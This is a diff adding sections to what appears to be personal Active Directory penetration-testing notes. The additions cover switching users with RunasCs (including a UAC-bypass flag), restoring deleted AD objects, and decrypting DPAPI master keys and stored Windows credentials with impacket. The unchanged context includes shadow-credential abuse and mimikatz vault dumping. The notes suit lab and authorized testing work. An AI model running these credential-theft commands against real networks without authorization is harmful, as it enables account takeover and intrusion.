@@ -95,6 +95,13 @@ Enter-PSSession {PSSession_ID_returned}
   - Dumping and using tickets is one of Rubeus's strong suits
   - `Rubeus.exe triage` to list available tickets
 
+**Changing Users**
+- If only one of our users can remote into the system, but we want to operate as another user, we can use [RunasCs](https://github.com/antonioCoco/RunasCs)
+- This is built on top of the base `runas.exe` and handles much better
+  - `RunasCs.exe {username} {password} {cmd} -d {domain} -r {host:port} `
+    - Also has `--bypass-uac`
+- Compiled executable in releases zip: [https://github.com/antonioCoco/RunasCs/releases/tag/v1.5](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5)
+
 **Shadow Credentials**
 - Seems certipy is the go-to here: `certipy shadow -u "{user}@{domain}" -p {password} -dc-ip {dc_ip} -account '{target_user}' auto`
 - If we have GenericWrite over a user from a group
@@ -110,6 +117,14 @@ Enter-PSSession {PSSession_ID_returned}
 	- We could also use certipy, which gives us the user's NTLM hash as well
 	  - `certipy auth -pfx {pfx_file} -dc-ip {dc-ip} -domain {domain_name} -username {target_user}`
 	  	- Add `-no-save` if we don't want the ccache file
+
+- **Finding Deleted Objects**
+  - Sometimes there can be interesting AD objects that have been deleted which we can use
+  - `Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects` to list deleted objects
+    - This will list objects deleted in chronological order, so we can restore the same deleted objects multiple times
+    - If we've imported PowerView, this will fail due to having a different `Get-ADObject`
+  - We can then restore the object with `Restore-ADObject -Identity "{object_GUID}"`
+    - We can undo this with `Remove-ADObject -Identity "{object_GUID}" -Recursive -Confirm:$false`
 
 **Abusing Domain Trusts**
 - Remember here that since we're using kerberos we have to use DNS instead of IPs
@@ -161,3 +176,11 @@ Enter-PSSession {PSSession_ID_returned}
 
 **Getting More Credentials**
 - `vault::cred /patch` will enumerate vault credentials (creds used in scheduled tasks)
+
+**DPAPI Keys**
+- Master encryption keys used by the Data Protection API (DPAPI) to encrypt data like passwords/certs
+- Derived from logon passwords
+- We'll find the master key in `~\AppData\Roaming\Microsoft\Protect\{user_SID}\`, which we can decrypt using impacket:
+  - `dpapi.py masterkey -file {masterkey_file} -sid {user_SID} -password '{user_password}'`
+- We can then use the masterkey to decrypt credentials, which are commonly found in `~\Appdata\(Roaming/Local)\Microsoft\Credentials\` again using impacket:
+  - `dpapi.py credential -file {credential_file} -key '0x{master_key}'`
